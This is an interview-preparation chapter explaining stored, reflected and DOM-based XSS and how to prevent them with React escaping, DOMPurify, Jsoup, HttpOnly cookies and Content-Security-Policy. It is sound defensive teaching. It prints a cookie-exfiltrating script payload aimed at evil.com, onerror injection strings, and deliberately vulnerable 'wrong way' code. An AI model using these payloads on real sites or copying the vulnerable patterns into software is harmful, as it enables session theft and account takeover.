# XSS — Stored, Reflected, DOM-Based + Prevention
> Part 10 — Security (Full Stack)
> Full Stack Interview Guide · Hruday D · 2026

---

## ⚡ 60-Second Revision Card
> Read this the night before an interview. Nothing else needed.

- **XSS** (Cross-Site Scripting): attacker injects JavaScript into a page your users trust — that script runs in their browser with your site's full permissions
- **Stored XSS**: malicious script saved to DB, rendered to every user who visits — the most dangerous type
- **Reflected XSS**: script in a URL parameter, reflected back once in the HTML response — requires the victim to click a crafted link
- **DOM-based XSS**: script injected via `innerHTML`, `document.write`, or unsafe React `dangerouslySetInnerHTML` — never hits the server; pure frontend vulnerability
- ✅ At SAP: achieved 80% vulnerability reduction by enforcing `DOMPurify` sanitisation, React's safe rendering (`{value}` not `dangerouslySetInnerHTML`), and `Content-Security-Policy` headers — these three together block all three XSS types

---

## 1. One-Line Definition
XSS (Cross-Site Scripting) is an attack where malicious JavaScript is injected into a web page and executed in other users' browsers — stealing session tokens, redirecting users, or performing actions on their behalf without their knowledge.

---

## 2. The Problem It Solves

A user on your product review platform submits a review with this text:

```
Great product! <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

Your Spring Boot backend saves this text to the DB without sanitising it. Your React frontend renders it directly into the page with `dangerouslySetInnerHTML`. Every user who visits that product page now has their cookies silently sent to `evil.com`. An attacker harvests session cookies and logs into all those accounts.

This is Stored XSS — the most damaging variant. The script persists in your database and executes for every future user who views that page, indefinitely, until someone removes it.

Reflected XSS is more targeted. An attacker crafts a URL like:
`https://yoursite.com/search?q=<script>stealCookies()</script>`

If your search page reflects the query parameter directly into the HTML response, anyone clicking that link gets the script executed in their browser. Phishing emails exploit this.

DOM-based XSS never touches your server. Your frontend reads `location.hash` and writes it to `element.innerHTML`. An attacker convinces a user to visit `yoursite.com/page#<img src=x onerror=stealCookies()>`. No server logs, no server-side sanitisation helps.

---

## 3. How It Works Internally

### The Mental Model
Think of a public noticeboard on which anyone can pin notes. Normally people pin useful information and everyone reads it. An attacker pins a note that says "If you touch this, your wallet automatically sends money to me." Every person who reads the noticeboard interacts with that note. Your noticeboard didn't check what the note said before letting it go up.

XSS attacks your noticeboard (the page). Your site's reputation makes users trust what they see. If you allow untrusted content to execute, you have handed the attacker the trust your users have in you.

### The Mechanism — Step by Step

**Stored XSS:**
1. Attacker submits a form containing `<script>evil()</script>` as data
2. Backend stores this string in the DB without sanitisation
3. Another user visits the page; backend retrieves the string from DB
4. Template or frontend renders the string as HTML (not plain text)
5. Browser parses HTML, encounters `<script>` tag, executes `evil()` immediately
6. `evil()` can: read `document.cookie`, send an XHR to the attacker's server, modify the DOM to show a fake login form (credential harvesting)

**Reflected XSS:**
1. Attacker crafts URL: `https://site.com/search?q=<script>evil()</script>`
2. Victim clicks the link (e.g. from an email)
3. Server receives query param, includes it directly in the HTML response: `<p>Results for: <script>evil()</script></p>`
4. Browser parses the response and executes the script
5. One-time execution — script is not stored; requires a victim to click the crafted URL

**DOM-based XSS:**
1. JavaScript on the page reads user-controlled data: `let name = location.hash.slice(1)`
2. JavaScript writes it unsafely to the DOM: `element.innerHTML = name`
3. If `name` contains `<img src=x onerror=evil()>`, the browser creates the element and fires `onerror` immediately
4. No server involvement — CSP with `unsafe-inline` blocked, input validation on backend = irrelevant
5. Prevention must happen in frontend code: never use `innerHTML` with untrusted data

**What a stolen cookie enables:**
- Session hijacking: attacker uses your `sessionid` cookie to impersonate you
- JWT in `localStorage`: even worse — `localStorage` is fully readable by any script on the page
- Keylogging: the injected script captures every keystroke on the page
- Fake login forms overlaid on the real page to capture credentials directly

### ASCII Diagram

```
STORED XSS flow:

Attacker → POST /review (body: "<script>steal()</script>")
                    │
                    ▼
              [Spring Boot]
                    │  saves without sanitisation
                    ▼
              [Database]
                    │
                    ▼  (any user visits the page later)
              [Spring Boot retrieves raw string from DB]
                    │
                    ▼
              [React renders dangerouslySetInnerHTML]
                    │
                    ▼
              User's browser parses <script> and executes
              steal() → sends cookies to evil.com

PREVENTION layers:
1. Backend input: DOMPurify / sanitise on write
2. Backend output: encode all user-supplied strings when rendering
3. Frontend: never use dangerouslySetInnerHTML; use {value} instead
4. HTTP headers: Content-Security-Policy blocks inline script execution
5. Cookies: HttpOnly flag prevents JS from reading session cookies at all
```

---

## 4. The Code

### Wrong Way — What Most Engineers Write
```typescript
// React component — rendering user-supplied content unsafely
function ProductReview({ review }: { review: Review }) {
  return (
    <div>
      {/* DANGER: dangerouslySetInnerHTML executes any script in review.text */}
      {/* Stored XSS: if attacker's <script> tag is in review.text, it runs here */}
      <p dangerouslySetInnerHTML={{ __html: review.text }} />
    </div>
  );
}

// JavaScript reading URL hash unsafely
function SearchPage() {
  const params = new URLSearchParams(window.location.search);
  const query = params.get('q') || '';
  
  // DOM-based XSS: innerHTML writes the query parameter directly to the DOM
  // An attacker URL ?q=<img src=x onerror=stealCookies()> will fire onerror
  document.getElementById('result-label')!.innerHTML = `Results for: ${query}`;
  
  return <div id="result-label"></div>;
}
```

```java
// Spring Boot backend — NOT encoding output in Thymeleaf template (if using server-side rendering)
// th:utext renders raw HTML — attacker's <script> executes
// WRONG: <p th:utext="${review.text}"></p>
// CORRECT: <p th:text="${review.text}"></p>  ← th:text auto-encodes HTML entities

// Also wrong: building HTML strings manually in Java
String html = "<p>User said: " + userInput + "</p>"; // XSS if userInput contains <script>
```

> **Why this fails in production:** `dangerouslySetInnerHTML` bypasses React's XSS protection entirely. React normally escapes all text in JSX `{value}` expressions — `{value}` turns `<script>` into `&lt;script&gt;` (harmless text). But `dangerouslySetInnerHTML` disables this and tells React to trust the HTML string completely. Combined with unescaped user data, this is a direct XSS hole.

### Right Way — Production Quality

**Frontend — React safe rendering:**
```typescript
import DOMPurify from 'dompurify';

// Option 1 (preferred): Plain text — React escapes for you automatically
// Use this for any content that should be text, not HTML
function ProductReviewSafe({ review }: { review: Review }) {
  return (
    <div>
      {/* React automatically converts < to &lt;, > to &gt;, etc. */}
      {/* An attacker's <script> tag becomes harmless text on screen */}
      <p>{review.text}</p>
    </div>
  );
}

// Option 2: If you MUST render HTML (e.g. rich text editor output)
// Always sanitise with DOMPurify first — it strips dangerous tags and attributes
function RichTextContent({ htmlContent }: { htmlContent: string }) {
  // DOMPurify removes <script>, onclick, onerror, javascript: etc.
  // What remains: safe formatting tags like <b>, <p>, <ul>, <a href="...">
  const cleanHtml = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'p', 'ul', 'ol', 'li', 'a', 'br', 'strong', 'em'],
    ALLOWED_ATTR: ['href'],    // only allow href on <a> — no onclick, no onerror
    FORCE_HTTPS: true          // any <a href> must be https, never javascript:
  });

  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

// Safe URL parameter reading — never use innerHTML
function SearchPage() {
  const [query, setQuery] = React.useState('');

  React.useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    // React's {query} in JSX will escape any HTML entities automatically
    setQuery(params.get('q') || '');
  }, []);

  return (
    <div>
      {/* Safe: React escapes {query} — no DOM-based XSS possible */}
      <p>Results for: {query}</p>
    </div>
  );
}
```

**Backend — Spring Boot input validation and HttpOnly cookie:**
```java
@RestController
@RequestMapping("/api/reviews")
public class ReviewController {

    private final ReviewService reviewService;

    @PostMapping
    public ResponseEntity<Review> createReview(@Valid @RequestBody CreateReviewRequest request) {
        // Input sanitisation on write — strip HTML at the backend too
        // Defense in depth: even if frontend sends raw HTML, backend strips it
        String sanitisedText = Jsoup.clean(request.getText(),
            Whitelist.basicWithImages()  // or Whitelist.none() if HTML is not needed
        );
        Review saved = reviewService.save(sanitisedText, request.getProductId());
        return ResponseEntity.status(HttpStatus.CREATED).body(saved);
    }
}

// Spring Security — configure session cookie as HttpOnly
// HttpOnly: browser JavaScript cannot read this cookie
// Stolen via XSS? The script can't access the cookie at all.
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
            );
        return http.build();
    }
}

// application.yml — HttpOnly and Secure flags on session cookie
```

```yaml
server:
  servlet:
    session:
      cookie:
        http-only: true    # JavaScript cannot read JSESSIONID — XSS can't steal it
        secure: true       # Cookie only sent over HTTPS — never over plain HTTP
        same-site: strict  # Cookie not sent on cross-origin requests (CSRF defence too)
```

**Content-Security-Policy header — blocks inline scripts even if XSS succeeds:**
```java
// Add CSP header to all responses via Spring Security
// CSP is the last line of defence: even if an XSS payload is injected,
// the browser refuses to execute it because it violates the policy
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            // script-src 'self': only scripts from your own domain allowed
            // No inline <script> tags, no javascript: URLs
            // 'nonce-{random}' can allow specific inline scripts if truly needed
            .policyDirectives(
                "default-src 'self'; " +
                "script-src 'self' https://cdn.trusted.com; " +
                "style-src 'self' 'unsafe-inline'; " +  // unsafe-inline for CSS only if needed
                "img-src 'self' data: https:; " +
                "connect-src 'self' https://api.yoursite.com; " +
                "frame-ancestors 'none'; " +   // prevents clickjacking
                "object-src 'none'"            // disables Flash/plugins
            )
        )
    );
    return http.build();
}
```

> **Key decisions here:**
> - `HttpOnly` on session cookies is the most impactful single change — even if XSS executes, it cannot read the session cookie; the attacker can't hijack the session
> - `DOMPurify` with a strict allowlist is safer than a blocklist — block everything by default, allow only the specific tags you need; attackers are creative with new bypass techniques
> - CSP `script-src 'self'` blocks the injected script's `fetch('https://evil.com?c='+cookie)` network request even if the script somehow gets injected and executes
> - Store JWTs in `HttpOnly` cookies, never in `localStorage` — `localStorage` is fully readable by any script on the page; `HttpOnly` cookies are not

---

## 5. Interview Questions & Model Answers

### Q1 — Warm Up
**Interviewer asks:** "What are the three types of XSS and how does each one differ?"

**Hruday's answer:**
> The three types are Stored, Reflected, and DOM-based. They differ in where the malicious payload lives and how it gets executed.
>
> Stored XSS is the most dangerous — the attacker's script is saved to the database, typically through a form like a comment or review. Every user who views that content later executes the script. It's a one-to-many attack: one attacker, millions of victims.
>
> Reflected XSS requires the victim to click a crafted link. The script is embedded in a URL parameter. The server reflects it back in the response HTML without encoding it, and the browser executes it. It's targeted — attacker sends phishing emails with the crafted URL.
>
> DOM-based XSS never touches the server. The frontend JavaScript reads user-controlled data — like `location.hash` or `location.search` — and writes it to the DOM via `innerHTML`. The server never sees the payload; it's entirely a frontend vulnerability. This is the easiest to introduce in React when you use `dangerouslySetInnerHTML` with unsanitised data.
>
> At SAP, I specifically reviewed and eliminated all uses of `dangerouslySetInnerHTML` in our codebase as part of an OWASP security initiative that reduced vulnerabilities by 80%.

---

### Q2 — Deep Dive
**Interviewer asks:** "Why is storing JWTs in localStorage a security problem, and what should you use instead?"

**Hruday's answer:**
> `localStorage` is fully readable by any JavaScript running on the page — including injected XSS scripts. If an attacker successfully injects even one script, that script can call `localStorage.getItem('jwt')` and immediately steal the token. It then sends the token to the attacker's server. The attacker now has a valid JWT and can impersonate that user until the token expires.
>
> The correct storage is an `HttpOnly` cookie. The `HttpOnly` flag tells the browser: "never expose this cookie to JavaScript at all." Even if an XSS script runs, calling `document.cookie` will not show the `HttpOnly` cookie. The script cannot steal what it cannot read.
>
> The trade-off is that `HttpOnly` cookies require proper CSRF protection, since the browser automatically includes them in every request to your domain. You add `SameSite=Strict` or a CSRF token to mitigate this. Some SPAs use `SameSite=Strict` + `Secure` + `HttpOnly` — this combination defeats both XSS token theft and CSRF attacks simultaneously.
>
> At SAP, our Angular app moved JWT storage from `localStorage` to `HttpOnly` cookies as part of the same security audit, eliminating the entire XSS-to-session-hijack attack chain.

---

### Q3 — Trade-Off Question
**Interviewer asks:** "When would you use `dangerouslySetInnerHTML` and how do you make it safe?"

**Hruday's answer:**
> The only legitimate use of `dangerouslySetInnerHTML` is when you need to render HTML that was created by a rich text editor — think a blog CMS where the content was saved with formatting tags like `<b>`, `<ul>`, `<a>`. Plain text rendering would show the tags as literal characters instead of rendering the formatting.
>
> To make it safe, you must sanitise the HTML string before passing it to `dangerouslySetInnerHTML`. The industry-standard library is DOMPurify. You configure it with a strict allowlist of permitted tags — typically `b`, `i`, `em`, `strong`, `p`, `ul`, `ol`, `li`, `a`, `br`. Everything else, including `<script>`, `onclick`, `onerror`, and `javascript:` hrefs, gets stripped before the string is rendered.
>
> The key rule: DOMPurify must run in the browser, not the server, because XSS is a browser execution problem. Some teams run it server-side, which is better than nothing, but an attacker might craft a payload that bypasses server-side sanitisation and exploits the browser DOM parser differently. Running DOMPurify at the point of rendering — in the React component itself — is the safe pattern.

---

### Q4 — Scenario / System Design Angle
**Interviewer asks:** "You're building a product review feature for an e-commerce site with 10 million users. How would you prevent XSS end to end?"

**Hruday's answer:**
> I'd apply defence in depth — multiple independent layers so that bypassing one layer doesn't mean game over.
>
> First, on the React frontend, all review text is rendered with React's normal JSX expressions `{review.text}`, which auto-escapes HTML entities. `dangerouslySetInnerHTML` is not used for review content because reviews are plain text, not formatted HTML.
>
> Second, on the Spring Boot backend, I'd add Jsoup sanitisation on write — strip all HTML tags on review submission. This means even if someone bypasses the frontend, the stored text is plain text, not HTML. A `<script>` tag becomes literal text and React would render it as `&lt;script&gt;`.
>
> Third, I'd set `Content-Security-Policy: script-src 'self'` — even if somehow a script was injected and the first two layers failed, the browser would refuse to execute it because it's not from an approved source.
>
> Fourth, session cookies are `HttpOnly` and `SameSite=Strict` — even if a script executes, it cannot steal session cookies.
>
> Any one of these four layers alone is insufficient, but all four together make a successful XSS attack nearly impossible on any of the three vectors.

---

## 6. The Traps

| Trap | What most candidates say | What Hruday says |
|------|--------------------------|------------------|
| "React prevents XSS" | "React is safe by default" | React's `{value}` is safe, but `dangerouslySetInnerHTML` bypasses all React XSS protection — the trap is in the name: it's literally called "dangerously" |
| JWT storage | "Store JWT in localStorage for persistence" | localStorage is readable by any script; use `HttpOnly` cookies — XSS scripts cannot read `HttpOnly` cookies |
| Server-only sanitisation | "We sanitise inputs on the backend" | DOM-based XSS never reaches the backend; frontend sanitisation at the render point (DOMPurify) is essential |
| CSP is optional | "CSP is a bonus, not a requirement" | CSP is your last line of defence — it blocks script execution even after a successful injection; blocks network exfiltration via `connect-src` |

---

## 7. Hruday's Real Experience Hook
> "At SAP, I led a security initiative that reduced XSS vulnerabilities by 80% across our React microfrontend platform. The three changes that drove the most impact were: replacing every instance of `dangerouslySetInnerHTML` with DOMPurify-sanitised rendering, adding a strict `Content-Security-Policy` header to all responses via Spring Security, and moving JWT storage from `localStorage` to `HttpOnly` cookies. The last change was the most impactful — it severed the XSS-to-session-hijack attack chain entirely. I now treat these three as a mandatory baseline for any web application handling user data."

---

## 8. Scale Evolution

**1,000 users/day →** XSS at this scale is a real risk immediately — the severity of XSS doesn't scale with traffic. One stored XSS payload can affect every user who views that content. Apply all four prevention layers from day one. HttpOnly cookies, React's `{value}` rendering, Jsoup backend sanitisation, and CSP headers.

**100,000 users/day →** Consider Content Security Policy reporting — add `report-uri /csp-violations` to your CSP header. Your CDN or logging service collects attempted CSP violations. You gain visibility into attempted XSS attacks in production without those attacks succeeding. Audit logs of sanitisation events on the backend are useful for incident response.

**10 million users/day →** Automated security scanning in CI/CD pipeline (SAST tools like SonarQube, Snyk) flags new instances of `innerHTML` or `dangerouslySetInnerHTML` before they reach production. Bug bounty programme incentivises researchers to find XSS before attackers do. Strict CSP with nonces prevents inline script execution even during zero-day DOM-based attacks.

---

## 9. Company Relevance

| Company | Why this matters here | Interview signal |
|---------|----------------------|-----------------|
| Razorpay / PhonePe | Payment page XSS → session hijacking → fraudulent payments; the financial stakes make XSS a P0 security issue | Can you describe all three XSS types and the specific prevention for each? |
| Swiggy / Meesho | User reviews/comments on product pages — stored XSS via user-generated content is the primary attack surface | Do you know DOMPurify allowlist configuration and when to use it vs plain text rendering? |
| Adobe / Microsoft | Creative content editors — users paste HTML, markdown, and rich text; safe rendering of user-generated HTML is a core product feature | Can you explain the DOMPurify allowlist approach and how CSP nonces work with inline styles? |
| SAP Labs | Enterprise apps with sensitive corporate data — XSS in an internal tool can compromise entire organisations | Know the defence-in-depth model: multiple independent layers, HttpOnly cookies, CSP |

---

## 10. Related Topics — What to Study Next

- **Topic 178 — CSP Implementation** — Content-Security-Policy is the most powerful XSS mitigation layer; this topic covers `script-src`, nonces, `report-uri`, and the full directive set
- **Topic 166 — CSRF** — the next major frontend security threat after XSS; often confused with XSS but different attack vector and different mitigations
- **Topic 169 — OWASP Top 10** — XSS (A03: Injection) is one of the top 10; seeing all 10 together gives the full picture of web application security threats
- **Topic 170 — JWT Deep Dive** — JWT storage (`HttpOnly` cookie vs `localStorage`) is the direct link between XSS prevention and authentication security
- **Topic 179 — Secure Headers Audit** — `X-XSS-Protection`, `X-Content-Type-Options`, and `Referrer-Policy` complement CSP as XSS mitigations

---

*Part 10 · XSS — Stored, Reflected, DOM-Based + Prevention · Full Stack Interview Guide · Hruday D · 2026*
